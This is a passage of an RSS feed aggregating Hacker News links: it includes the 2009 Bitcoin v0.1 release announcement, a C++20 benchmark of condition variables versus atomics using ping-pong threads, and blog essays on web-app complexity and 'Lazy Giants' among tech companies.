https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/78612/how-it-feels.png 1260w,
https://michalpietraszko.com/static/101dc9780084c3b29106640f8ea67894/9cea8/how-it-feels.png 1278w" sizes="(max-width: 630px) 100vw, 630px" loading="lazy">
  </a>
    </span></p>
<h3>Simplicity through innovation in older frameworks.</h3>
<p>Ruby on Rails and Laravel are relevant.</p>
<p>Consider them. Their maturity will allow you to move very fast.</p>
<p>They have recently innovated in many interesting ways.</p>
<p>Take a look at <a href="https://laravel.com/docs/8.x/blade#components">Laravel’s components</a> or RoR’s <a href="https://hotwire.dev/">Hotwire</a>!</p>
<p>You can have an SPA experience while still writing a unified app!</p>
<h3>Simplicity through new generation of React frameworks.</h3>
<p>People who want to stay in JavaScript land should consider the following.</p>
<p><a href="https://nextjs.org/">Next.js</a> started a good trend by putting React and server logic next to each other.</p>
<p><a href="https://blitzjs.com/">Blitz.js</a>, which is based on Next, is a good ruby on rails equivalent. It brings the right amount of abstraction that makes you treat your app as a unified whole. Using it sometimes feels like cheating - in a good way. It inspired me to talk about the complexity issue in our ecosystem.</p>
<p><a href="https://remix.run/">Remix</a> with a fresh take on the problem domain and bringing a lot of good and forgotten patterns.</p>
<h3>React’s Server Components to make everything even better.</h3>
<p>Recently, the React team has presented a new idea that can make our component-driven world better.</p>
<p><a href="https://reactjs.org/blog/2020/12/21/data-fetching-with-react-server-components.html">Consider reading the article and watching their presentation</a>.</p>
<p>When they are released, then we will end up in the best-case scenario where web apps are only dynamic in
places that require it without having to jump between server-side and client-side paradigms.</p>
<p>All of the frameworks above will benefit from them.</p>
<h2>In conclusion</h2>
<p>We should start asking ourselves if our standard approach is something we still want to maintain.</p>
<p>Suggested frameworks reduce complexity and allow us to experience the simplicity of older approaches while having the benefits of the modern approach.</p>
<p>They embrace the fact that both backend and frontend are tightly coupled and make the developer experience unified.</p>
<p>This is an opportunity to write less code, spend less time testing, simplify orchestration, spend less money on more people having to maintain the complexity, and put more effort into products we are trying to create.</p></section></div>]]>
            </description>
            <link>https://michalpietraszko.com/web-apps-are-too-complex-this-is-how-we-can-simplify-them/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726700</guid>
            <pubDate>Mon, 11 Jan 2021 09:42:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bitcoin v0.1 Released (2009)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25726674">thread link</a>) | @Bluestein
<br/>
January 11, 2021 | http://satoshinakamoto.me/2009/01/09/bitcoin-v0-1-released/ | <a href="https://web.archive.org/web/*/http://satoshinakamoto.me/2009/01/09/bitcoin-v0-1-released/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content"> 
	<section id="primary">
		<main id="main" role="main">
				
			<span id="shash">
	<article id="post-80">
		
				
		<!-- .entry-header -->

		<div>


			<p>Announcing the first release of Bitcoin, a new electronic cash<br>
system that uses a peer-to-peer network to prevent double-spending.<br>
It’s completely decentralized with no server or central authority.</p>
<p>See bitcoin.org for screenshots.</p>
<p>Download link:<br>
http://downloads.sourceforge.net/bitcoin/bitcoin-0.1.0.rar</p>
<p>Windows only for now. Open source C++ code is included.</p>
<p>– Unpack the files into a directory<br>
– Run BITCOIN.EXE<br>
– It automatically connects to other nodes</p>
<p>If you can keep a node running that accepts incoming connections,<br>
you’ll really be helping the network a lot. Port 8333 on your<br>
firewall needs to be open to receive incoming connections.</p>
<p>The software is still alpha and experimental. There’s no guarantee<br>
the system’s state won’t have to be restarted at some point if it<br>
becomes necessary, although I’ve done everything I can to build in<br>
extensibility and versioning.</p>
<p>You can get coins by getting someone to send you some, or turn on<br>
Options-&gt;Generate Coins to run a node and generate blocks. I made<br>
the proof-of-work difficulty ridiculously easy to start with, so<br>
for a little while in the beginning a typical PC will be able to<br>
generate coins in just a few hours. It’ll get a lot harder when<br>
competition makes the automatic adjustment drive up the difficulty.<br>
Generated coins must wait 120 blocks to mature before they can be<br>
spent.</p>
<p>There are two ways to send money. If the recipient is online, you<br>
can enter their IP address and it will connect, get a new public<br>
key and send the transaction with comments. If the recipient is<br>
not online, it is possible to send to their Bitcoin address, which<br>
is a hash of their public key that they give you. They’ll receive<br>
the transaction the next time they connect and get the block it’s<br>
in. This method has the disadvantage that no comment information<br>
is sent, and a bit of privacy may be lost if the address is used<br>
multiple times, but it is a useful alternative if both users can’t<br>
be online at the same time or the recipient can’t receive incoming<br>
connections.</p>
<p>Total circulation will be 21,000,000 coins. It’ll be distributed<br>
to network nodes when they make blocks, with the amount cut in half<br>
every 4 years.</p>
<p>first 4 years: 10,500,000 coins<br>
next 4 years: 5,250,000 coins<br>
next 4 years: 2,625,000 coins<br>
next 4 years: 1,312,500 coins<br>
etc…</p>
<p>When that runs out, the system can support transaction fees if<br>
needed. It’s based on open market competition, and there will<br>
probably always be nodes willing to process transactions for free.</p>
<p>Satoshi Nakamoto
</p>
<p element-id="80">40,665&nbsp;total views, 70&nbsp;views today</p>

<!-- AddThis Advanced Settings above via filter on the_content --><!-- AddThis Advanced Settings below via filter on the_content --><!-- AddThis Advanced Settings generic via filter on the_content --><!-- AddThis Share Buttons above via filter on the_content --><!-- AddThis Share Buttons below via filter on the_content --><!-- AddThis Share Buttons generic via filter on the_content -->


<!-- SatoshiNakamoto.me Wide -->
<p><ins data-ad-client="ca-pub-4103758802938532" data-ad-slot="3538571140"></ins>


			<span id="source">https://www.mail-archive.com/cryptography%40metzdowd.com/msg10142.html</span></p><!-- <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="http://satoshinakamoto.me/2009/01/09/bitcoin-v0-1-released/"
    dc:identifier="http://satoshinakamoto.me/2009/01/09/bitcoin-v0-1-released/"
    dc:title="Bitcoin v0.1 released"
    trackback:ping="http://satoshinakamoto.me/2009/01/09/bitcoin-v0-1-released/trackback/" />
</rdf:RDF> -->
			
		</div><!-- .entry-content -->
		
		<!-- .entry-footer -->

	</article>
</span>


		
		</main><!-- #main -->
	</section><!-- #primary -->
	
		<!-- #secondary -->	
	
	</div></div>]]>
            </description>
            <link>http://satoshinakamoto.me/2009/01/09/bitcoin-v0-1-released/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726674</guid>
            <pubDate>Mon, 11 Jan 2021 09:37:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Performance Comparison of Condition Variables and Atomics in C++20]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25726670">thread link</a>) | @ibobev
<br/>
January 11, 2021 | http://modernescpp.com/index.php/performancecomparison-of-condition-variables-and-atomics-in-c-20 | <a href="https://web.archive.org/web/*/http://modernescpp.com/index.php/performancecomparison-of-condition-variables-and-atomics-in-c-20">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="blogContent">
				<p>After the introduction to <code>std::atomic_flag</code> in my last post <a href="https://bit.ly/3nF8r3f">Synchronization with Atomics in C++20</a>, I want to dive deeper. Today, I create a ping-pong game using condition variables,<code> std::atomic_flag</code>, and <code>std::atomic&lt;bool&gt;</code>. Let's play.</p>

<p>&nbsp;<img src="http://modernescpp.com/images/blog/Cpp20/PerformanceComparisonConditionVariablesAtomics/TimelineCpp20CoreLanguage.png" alt="TimelineCpp20CoreLanguage" width="650" height="265"></p>
<p>The key question I want to answer in this post is the following: What is the fastest way to synchronize threads in C++20? I use in this post three different data types: <code>std::condition_variable</code>, <code>std::atomic_flag</code>, and <code>std::atomic&lt;bool&gt;</code>.</p>
<p>To get comparable numbers, I implement a ping-pong game. One thread executes a <code>ping</code> function and the other thread a <code>pong</code> function. For simplicity reasons, I call the thread executing the <code>ping</code> function the ping thread and the other thread the pong thread. The ping thread waits for the notification of the pong threads and sends the notification back to the pong thread. The game stops after 1,000,000 ball changes. I perform each game five times to get comparable performance numbers.</p>
<p>I made my performance test with the brand new Visual Studio compiler because it already supports synchronization with atomics. Additionally, I compiled the examples with maximum optimization (<code>/Ox</code>).</p>
<p><img src="http://modernescpp.com/images/blog/Cpp20/PerformanceComparisonConditionVariablesAtomics/windowsCompiler.png" alt="windowsCompiler" width="500" height="139"></p>
<p>Let me start with the C++11.</p>
<h2 id="h1-condition-variables">Condition Variables</h2>

<!-- HTML generated using hilite.me -->
<div>
<pre><span>// pingPongConditionVariable.cpp</span>

<span>#include &lt;condition_variable&gt;</span>
<span>#include &lt;iostream&gt;</span>
<span>#include &lt;atomic&gt;</span>
<span>#include &lt;thread&gt;</span>

<span>bool</span> dataReady{<span>false</span>};

std<span>::</span>mutex mutex_;
std<span>::</span>condition_variable condVar1;          <span>// (1)</span>
std<span>::</span>condition_variable condVar2;         <span> // (2)</span>

std<span>::</span>atomic<span>&lt;</span><span>int</span><span>&gt;</span> counter{};
constexpr <span>int</span> countlimit <span>=</span> <span>1</span><span>'</span><span>000</span><span>'</span><span>000</span>;

<span>void</span> <span>ping</span>() {

    <span>while</span>(counter <span>&lt;=</span> countlimit) {
        {
            std<span>::</span>unique_lock<span>&lt;</span>std<span>::</span>mutex<span>&gt;</span> lck(mutex_);
            condVar1.wait(lck, []{<span>return</span> dataReady <span>==</span> <span>false</span>;});
            dataReady <span>=</span> <span>true</span>;
        }
        <span>++</span>counter;                         <span> </span>
        condVar2.notify_one();              <span>// (3)</span>
  }
}

<span>void</span> <span>pong</span>() {

    <span>while</span>(counter <span>&lt;</span> countlimit) {  
        {
            std<span>::</span>unique_lock<span>&lt;</span>std<span>::</span>mutex<span>&gt;</span> lck(mutex_);
            condVar2.wait(lck, []{<span>return</span> dataReady <span>==</span> <span>true</span>;});
            dataReady <span>=</span> <span>false</span>;
        }
        condVar1.notify_one();           <span> // (3)</span>
  }

}

<span>int</span> <span>main</span>(){

    <span>auto</span> start <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now();  

    std<span>::</span><span>thread</span> t1(ping);
    std<span>::</span><span>thread</span> t2(pong);

    t1.join();
    t2.join();
  
    std<span>::</span>chrono<span>::</span>duration<span>&lt;</span><span>double</span><span>&gt;</span> dur <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now() <span>-</span> start;
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Duration: "</span> <span>&lt;&lt;</span> dur.count() <span>&lt;&lt;</span> <span>" seconds"</span> <span>&lt;&lt;</span> std<span>::</span>endl;

}
</pre>
</div>

<p>I use two condition variables in the program: <code>condVar1</code> and <code>condVar2 </code>(line 1 and 2). The ping thread wait for the notification of <code>condVar1</code> and sends its notification with <code>condVar2</code>. <code>dataReady</code> protects against spurious and lost wakeups (see "<a href="http://modernescpp.com/index.php/c-core-guidelines-be-aware-of-the-traps-of-condition-variables">C++ Core Guidelines: Be Aware of the Traps of Condition Variables</a>"). The ping-pong game ends when <code>counter</code> reaches the <code>countlimit</code>. The <code>nofication_one</code> calls (lines 3) and the counter are thread-safe and are, therefore, outside the critical region.</p>
<p>Here are the numbers:</p>
<p><img src="http://modernescpp.com/images/blog/Cpp20/PerformanceComparisonConditionVariablesAtomics/pingPongConditionVariable.png" alt="pingPongConditionVariable" width="400" height="294"></p>
<p>The average execution time is 0.52 seconds.</p>
<p>Porting this play to <code>std::atomic_flags</code>'s in C++20 is straightforward.</p>
<h2 id="h2-std-atomic-flag"><code>std::atomic_flag</code></h2>
<p>Here is the play using two atomic flags.</p>
<h3 id="h2-1-two-atomic-flags">Two Atomic Flags</h3>
<p>In the following program, I replace the waiting on the condition variable with the waiting on the atomic flag and the notification of the condition variable with the setting of the atomic flag followed by the notification.</p>
<!-- HTML generated using hilite.me -->
<div>
<pre><span>// pingPongAtomicFlags.cpp</span>

<span>#include &lt;iostream&gt;</span>
<span>#include &lt;atomic&gt;</span>
<span>#include &lt;thread&gt;</span>

std<span>::</span>atomic_flag condAtomicFlag1{};
std<span>::</span>atomic_flag condAtomicFlag2{};

std<span>::</span>atomic<span>&lt;</span><span>int</span><span>&gt;</span> counter{};
constexpr <span>int</span> countlimit <span>=</span> <span>1</span><span>'</span><span>000</span><span>'</span><span>000</span>;

<span>void</span> <span>ping</span>() {
    <span>while</span>(counter <span>&lt;=</span> countlimit) {
        condAtomicFlag1.wait(<span>false</span>);               <span>// (1)</span>
        condAtomicFlag1.clear();                   <span>// (2)</span>

        <span>++</span>counter;
        
        condAtomicFlag2.test_and_set();           <span>// (4)</span>
        condAtomicFlag2.notify_one();             <span>// (3)</span>
    }
}

<span>void</span> <span>pong</span>() {
    <span>while</span>(counter <span>&lt;</span> countlimit) {
        condAtomicFlag2.wait(<span>false</span>);
        condAtomicFlag2.clear();
        
        condAtomicFlag1.test_and_set();
        condAtomicFlag1.notify_one();
    }
}

<span>int</span> <span>main</span>() {

     <span>auto</span> start <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now();  

    condAtomicFlag1.test_and_set();                    <span>// (5)</span>
    std<span>::</span><span>thread</span> t1(ping);
    std<span>::</span><span>thread</span> t2(pong);

    t1.join();
    t2.join();

    std<span>::</span>chrono<span>::</span>duration<span>&lt;</span><span>double</span><span>&gt;</span> dur <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now() <span>-</span> start;
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Duration: "</span> <span>&lt;&lt;</span> dur.count() <span>&lt;&lt;</span> <span>" seconds"</span> <span>&lt;&lt;</span> std<span>::</span>endl;

}
</pre>
</div>

<p>A call <code>condAtomicFlag1.wait(false)</code> (1) blocks, if the value of the atomic flag is <code>false</code>. On the contrary, it returns if <code>condAtomicFlag1</code> has the value <code>true</code>. The boolean value serves as a kind of predicate and must, therefore, set back to <code>false</code> (2). Before the notification (3) is sent to the pong thread,&nbsp;<code>condAtomicFlag1</code> is set to <code>true </code>(4). The initial setting of<code> condAtomicFlag1</code> to <code>true</code> (5) starts the game. <span></span></p>
<p>Thanks to <code>std::atomic_flag</code> the game ends earlier.</p>
<p><img src="http://modernescpp.com/images/blog/Cpp20/PerformanceComparisonConditionVariablesAtomics/pingPongAtomicFlags.png" alt="pingPongAtomicFlags" width="400" height="310"></p>
<p>On average, a game takes 0.32 seconds.</p>
<p>When you analyze the program, you may recognize, that one atomics flag is sufficient for the play.</p>
<h3 id="h2-2-one-atomic-flag">One Atomic Flag</h3>
<p>Using one atomic flag makes the play easier to understand.</p>

<!-- HTML generated using hilite.me -->
<div>
<pre><span>// pingPongAtomicFlag.cpp</span>

<span>#include &lt;iostream&gt;</span>
<span>#include &lt;atomic&gt;</span>
<span>#include &lt;thread&gt;</span>

std<span>::</span>atomic_flag condAtomicFlag{};

std<span>::</span>atomic<span>&lt;</span><span>int</span><span>&gt;</span> counter{};
constexpr <span>int</span> countlimit <span>=</span> <span>1</span><span>'</span><span>000</span><span>'</span><span>000</span>;

<span>void</span> <span>ping</span>() {
    <span>while</span>(counter <span>&lt;=</span> countlimit) {
        condAtomicFlag.wait(<span>true</span>);
        condAtomicFlag.test_and_set();
        
        <span>++</span>counter;
        
        condAtomicFlag.notify_one();
    }
}

<span>void</span> <span>pong</span>() {
    <span>while</span>(counter <span>&lt;</span> countlimit) {
        condAtomicFlag.wait(<span>false</span>);
        condAtomicFlag.clear();
        condAtomicFlag.notify_one();
    }
}

<span>int</span> <span>main</span>() {

     <span>auto</span> start <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now();  

    
    condAtomicFlag.test_and_set();
    std<span>::</span><span>thread</span> t1(ping);
    std<span>::</span><span>thread</span> t2(pong);

    t1.join();
    t2.join();

    std<span>::</span>chrono<span>::</span>duration<span>&lt;</span><span>double</span><span>&gt;</span> dur <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now() <span>-</span> start;
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Duration: "</span> <span>&lt;&lt;</span> dur.count() <span>&lt;&lt;</span> <span>" seconds"</span> <span>&lt;&lt;</span> std<span>::</span>endl;

}
</pre>
</div>

<p>In this case, the ping thread blocks on <code>true</code> but the pong thread blocks on <code>false</code>. From the performance perspective, using one or two atomic flags makes no difference.</p>
<p>&nbsp;<img src="http://modernescpp.com/images/blog/Cpp20/PerformanceComparisonConditionVariablesAtomics/pingPongAtomicFlag.png" alt="pingPongAtomicFlag" width="400" height="309"></p>
<p>The average execution time is 0.31 seconds.</p>
<p>&nbsp;I used in this example <code>std::atomic_flag</code> such as an atomic boolean. Let's give it another try with<code> std::atomic&lt;bool&gt;</code>.</p>
<h2 id="h3-std-atomic-lt-bool-gt"><code>std::atomic&lt;bool&gt;</code></h2>
<p>From the readability perspective, I prefer the following C++20 implementation based on <code>std::atomic&lt;bool&gt;.</code></p>

<!-- HTML generated using hilite.me -->
<div>
<pre><span>// pingPongAtomicBool.cpp</span>

<span>#include &lt;iostream&gt;</span>
<span>#include &lt;atomic&gt;</span>
<span>#include &lt;thread&gt;</span>

std<span>::</span>atomic<span>&lt;</span><span>bool</span><span>&gt;</span> atomicBool{};

std<span>::</span>atomic<span>&lt;</span><span>int</span><span>&gt;</span> counter{};
constexpr <span>int</span> countlimit <span>=</span> <span>1</span><span>'</span><span>000</span><span>'</span><span>000</span>;

<span>void</span> <span>ping</span>() {
    <span>while</span>(counter <span>&lt;=</span> countlimit) {
        atomicBool.wait(<span>true</span>);
        atomicBool.store(<span>true</span>);

        <span>++</span>counter;
        
        atomicBool.notify_one();
    }
}

<span>void</span> <span>pong</span>() {
    <span>while</span>(counter <span>&lt;</span> countlimit) {
        atomicBool.wait(<span>false</span>);
        atomicBool.store(<span>false</span>);
        atomicBool.notify_one();
    }
}

<span>int</span> <span>main</span>() {

    std<span>::</span>cout <span>&lt;&lt;</span> std<span>::</span>boolalpha <span>&lt;&lt;</span> std<span>::</span>endl;

    std<span>::</span>cout <span>&lt;&lt;</span> <span>"atomicBool.is_lock_free(): "</span>              <span>// (1)</span>
              <span>&lt;&lt;</span> atomicBool.is_lock_free()  <span>&lt;&lt;</span> std<span>::</span>endl; 

    std<span>::</span>cout <span>&lt;&lt;</span> std<span>::</span>endl;

    <span>auto</span> start <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now();

    atomicBool.store(<span>true</span>);
    std<span>::</span><span>thread</span> t1(ping);
    std<span>::</span><span>thread</span> t2(pong);

    t1.join();
    t2.join();

    std<span>::</span>chrono<span>::</span>duration<span>&lt;</span><span>double</span><span>&gt;</span> dur <span>=</span> std<span>::</span>chrono<span>::</span>system_clock<span>::</span>now() <span>-</span> start;
    std<span>::</span>cout <span>&lt;&lt;</span> <span>"Duration: "</span> <span>&lt;&lt;</span> dur.count() <span>&lt;&lt;</span> <span>" seconds"</span> <span>&lt;&lt;</span> std<span>::</span>endl;

}
</pre>
</div>

<p><code>std::atomic&lt;bool&gt;</code> can internally use a locking mechanism such as a mutex. As I assumed it, my Windows runtime is lock-free (1).</p>
<p><img src="http://modernescpp.com/images/blog/Cpp20/PerformanceComparisonConditionVariablesAtomics/pingPongAtomicBool.png" alt="pingPongAtomicBool" width="400" height="539"></p>
<p>On average, the execution time is 0.38 seconds.</p>
<h2 id="h4-all-numbers">All Numbers</h2>
<p>As expected, condition variables are the slowest way, and atomic flag the fastest way to synchronize threads. The performance of a<code> std::atomic&lt;bool&gt;</code> is in-between. But there is one downside with <code>std:.atomic&lt;bool&gt;. std::atomic_flag i</code>s the only atomic data type which is lock-free.</p>
<p><img src="http://modernescpp.com/images/blog/Cpp20/PerformanceComparisonConditionVariablesAtomics/PerformanceComparison.png" alt="PerformanceComparison" width="500" height="51"></p>
<h2 id="h5-what-s-next">What's next?</h2>
<p>With C++20, we have a few new mechanisms for thread coordination. In my next post, I will take a deeper view into latches, barriers, and semaphores. They also allow it to play Ping-Pong.</p>

<div>
	<p><strong>Thanks a lot to my <a href="https://www.patreon.com/rainer_grimm">Patreon Supporters</a></strong><strong>: Matt Braun, Roman Postanciuc, Tobias Zindl, Marko, </strong><span title="Emyr Williams"><strong>G Prvulovic, Reinhold Dröge, Abernitzke,</strong> </span><strong><span title="Emyr Williams">Frank Grimm</span></strong><span title="Emyr Williams"><strong>, Sakib, Broeserl, </strong></span><strong><span title="Emyr Williams">António Pina, Darshan Mody, Sergey Agafyin, <span data-tag="user-details-full-name">Андрей Бурмистров, Jake, GS, Lawton Shoemake, Animus24, Jozo Leko, John Breland, espkk, Wolfgang Gärtner</span></span><span title="Emyr Williams"><span><span></span></span></span>,&nbsp; Louis St-Amour, Stephan Roslen, Venkat Nandam, Jose Francisco, Douglas Tinkham, Kuchlong Kuchlong, Avi Kohn, Robert Blanch, Truels Wissneth, Kris Kafka, Mario Luoni, Neil Wang, Friedrich Huber, lennonli, Pramod Tikare Muralidhara, Peter Ware, and Ove Svensson.<br></strong></p>

<p><strong>Thanks in particular to Jon Hess, Lakshman,</strong> <strong>Christian Wittenhorst, Sherhy Pyton, Dendi Suhubdy, and Sudhakar Belagurusamy.&nbsp; <br></strong></p>

<h2>Seminars</h2>
<p>I'm happy to give online-seminars or face-to-face seminars world-wide. Please call me if you have any questions.</p>
<h3>Bookable (Online)</h3>
<h4>Deutsch</h4>
<ul>
<li><a href="https://www.modernescpp.de/index.php/c/2-c/29-embedded-programmierung-mit-modernem-c20201029102414">Embedded Programmierung mit modernem C++:&nbsp; </a>26.01.2021 - 28.01.2021</li>
</ul>
<h4>English</h4>
<ul>
<li><a href="https://www.modernescpp.net/index.php/c/2-c/31-c-20">C++20 - A Deep Insight: </a>Feb. 1. 2021 - Feb. 3. 2021 (16:00 - 20:00 UTC)</li>
</ul>
<h3>Standard Seminars&nbsp;</h3>
<p>Here is a compilation of my standard seminars. These seminars are only meant to give you a first orientation.</p>
<ul>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/22">C++ - The Core Language</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/23">C++ - The Standard Library</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/23">C++ - Compact</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/18">C++11 and C++14</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/19">Concurrency with Modern C++</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/21">Design Patterns and Architecture Patterns with C++</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/17">Embedded Programming with Modern C++</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/17">Generic Programming (Templates) with C++</a></li>
</ul>
<h4>New</h4>
<ul>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/16">Clean Code with Modern C++</a></li>
<li><a href="https://www.modernescpp.net/index.php/c/plan/2-c/25">C++20</a></li>
</ul>
<h3>Contact Me</h3>
<ul>
<li>Tel.: +49 7472 917441</li>
<li>Mobil: +49 152 31965939</li>
<li>Mail: <a href="http://modernescpp.com/%3Ca%20href="><span id="cloak8b43dc957fcd69a88d9ae0b5430a0dda">This email address is being protected from spambots. You need JavaScript enabled to view it.</span></a></li>
<li>German Seminar Page: <a href="https://www.modernescpp.de/">www.ModernesCpp.de</a></li>
<li>English Seminar Page: <a href="http://www.modernescpp.net/">www.ModernesCpp.net</a></li>
</ul>
<h3>Modernes C++,</h3>
<p><img src="http://modernescpp.com/images/signatur/RainerGrimmSmall.png" alt="RainerGrimmSmall"></p></div>




			</div></div>]]>
            </description>
            <link>http://modernescpp.com/index.php/performancecomparison-of-condition-variables-and-atomics-in-c-20</link>
            <guid isPermaLink="false">hacker-news-small-sites-25726670</guid>
            <pubDate>Mon, 11 Jan 2021 09:37:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lazy Giants]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25726607">thread link</a>) | @camamac
<br/>
January 11, 2021 | https://callumacdonald.com/lazy-giants/ | <a href="https://web.archive.org/web/*/https://callumacdonald.com/lazy-giants/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<div id="primary">
		<main id="main" role="main">

			
				
<article id="post-1152" class="page">
		<!-- .entry-header -->

	<div>
		
<p>Back in May I read <a href="https://salon.thefamily.co/the-five-stages-of-denial-6061dbbfb62d?gi=f8b1c8036dda">an article</a> by <a rel="noreferrer noopener" href="https://www.linkedin.com/in/nicolas-colin-the-family/" target="_blank">Nicolas Colin</a>, founder of The Family, a VC and PE firm. The article speaks about the five stages of denial that companies go through when their industry goes through disruption. The article is framed around big industries like Music, Film, Publishing and Retail, and how large companies in these industries become disrupted by tech upstarts. What I’ve realized, and what I’ve been thinking increasingly frequently, is that these tech upstarts have increasingly become Lazy Giants.  </p>



<p>A Lazy Giant is a specific kind of giant. Every company, when it reaches a certain size, becomes a giant, and decisions that giants make have large ripples across entire industries. However a Lazy Giant is a company that loses track of it’s original goal, and starts to focus on being profitable at the cost of everything else, sometimes even eventually it’s own long term profitability. </p>







<p>The first company that I want to talk about is Facebook. I don’t like using Facebook. I occasionally open Facebook in a tab to check for any valuable notifications or any birthdays. Facebook, originally, was in the business of creating social networks. Helping people keep in touch with old friends and colleagues and for sharing photos of your family holiday. However the monetization of the platform comes from selling our attention to advertisers. Facebook have been optimizing their algorithms to keep users scrolling and to keep them looking at ads, rather than helping them to stay in touch with friends.</p>



<p>But, you might argue, Facebook has just pivoted. They are now an advertising company, and optimise for their advertising algorithm. They aren’t a Lazy Giant, they are just focusing on a different problem, how to get ads in front of the right people. </p>



<p>The issue with this is that <a rel="noreferrer noopener" href="https://theintercept.com/2020/12/24/facebook-ad-targeting-small-business/" target="_blank">Facebook admits that their advertising algorithm isn’t that good</a>. Facebook isn’t optimizing their advertising algorithm to maximize utility to advertisers, they are optimizing their algorithm to maximize the amount of money that they can charge advertisers. Why would Facebook make their algorithm more efficient if they charge per view? </p>



<p>(This is where the anticompetitive argument against Facebook starts to hold water. If social networks were competing for advertising bucks they would be forced to show that their algorithm is more efficient than their competition. As it is, Facebook and Instagram have similar algorithms and aren’t forced to be better than anyone else, or even any good for that matter.)</p>







<p>The second giant that I think has gotten lazy is Amazon. I have a large amount of respect for Jeff Bezos, <a rel="noreferrer noopener" href="http://blog.idonethis.com/jeff-bezos-self-discipline-writing/" target="_blank">specifically the way that he runs meetings at Amazon</a>. However, for a company that claims to be obsessively customer focused, they sure <a rel="noreferrer noopener" href="https://www.ft.com/content/bb03ba1c-add3-4440-9bf2-2a65566aef4a" target="_blank">have had a lot of scandals around</a> <a rel="noreferrer noopener" href="https://www.theverge.com/2020/9/4/21423429/amazon-top-reviewers-uk-fraud" target="_blank">their product reviews</a>. <a rel="noreferrer noopener" href="https://www.ft.com/content/bb03ba1c-add3-4440-9bf2-2a65566aef4a" target="_blank">A FT investigation found suspicious behavior by 9 of top 10 UK contributors on feedback</a>. </p>



<p>But the scandal that I only more recently became aware of is a bait and switch technique that some sellers are using, where they take a successful product listing with lots of positive reviews, and change the product to something else that isn’t as good. Customers see the positive reviews and assume that it is for the product listed, trusting the Amazon reviews. </p>



<p>In this article the author bought a mini drone, only to find out that <a rel="noreferrer noopener" href="https://arstechnica.com/tech-policy/2020/12/amazon-still-hasnt-fixed-its-problem-with-bait-and-switch-reviews/?utm_source=hackernewsletter&amp;utm_medium=email&amp;utm_term=cutting_room_floor" target="_blank">most of the reviews on the product were for a jar of honey</a>. This is an easy problem to solve. Just limit the amount of changes that can be made to a product while keeping the reviews. If Amazon was as obsessively customer focused as they say, this would have already been fixed. But is hasn’t, because positive reviews encourage people to spend more on Amazon, further lining the pockets of the company. </p>



<p>But the problem for Amazon isn’t just with reviews. Investigations by the <a rel="noreferrer noopener" href="https://www.inc.com/jason-aten/heres-how-amazon-gets-you-to-buy-its-own-products-why-thats-bad-news-for-third-party-sellers.html" target="_blank">Washington Post</a> and the <a rel="noreferrer noopener" href="https://www.wsj.com/articles/amazon-scooped-up-data-from-its-own-sellers-to-launch-competing-products-11587650015" target="_blank">Wall Street Journal</a> have found that Amazon promotes its own products, products that it makes and has a larger margin on, above products made by 3rd party sellers, even when the 3rd party seller’s product has better reviews. This isn’t the “customer obsession” that Bezos claims, this is profit obsession. Despite Amazon’s <a rel="noreferrer noopener" href="https://www.forbes.com/sites/quora/2017/04/21/what-is-jeff-bezos-day-1-philosophy/" target="_blank">Day 1 mentality</a>, Amazon is turning, in parts, into a Lazy Giant. </p>



<p>The final Lazy Giant I want to mention is Google. Google is a giant that operates in many industries, including entertainment (YouTube), advertising (AdWords), enterprise solutions (Gmail and Drive), and IoT hardware/software (Nest). I have mixed feelings on Google. On one hand, I love my Google Home devices. On the other hand, I’m using YouTube less because I’m finding the suggestions to be less intellectually stimulating than I would like and there are too many adverts. </p>



<p>But today I want to talk about Google Docs. I remember at school when people first started to use Google Docs. The idea that the documents were stored on the cloud, and that we could edit them simultaneously? That blew my mind. And then Google did the same thing with Slides and Sheets, replicating Microsoft’s PowerPoint and Excel. Both of these tools were good, but neither as smooth or powerful as the Microsoft original. But hey, it was only early days. Or so I thought.</p>



<p>Since then Google haven’t changed a thing. As this article explains lucidly, <a rel="noreferrer noopener" href="https://secondbreakfast.co/google-blew-a-ten-year-lead" target="_blank">Google managed to blow a 10 year lead</a>. Microsoft Word is now accessible online, and can auto-save online using OneDrive. Of the three giants that I mention here, Google is the one I am most disappointed in (<a rel="noreferrer noopener" href="https://gizmodo.com/tag/dont-be-evil" target="_blank">especially since they removed “Don’t Be Evil” from their code of conduct</a>). </p>



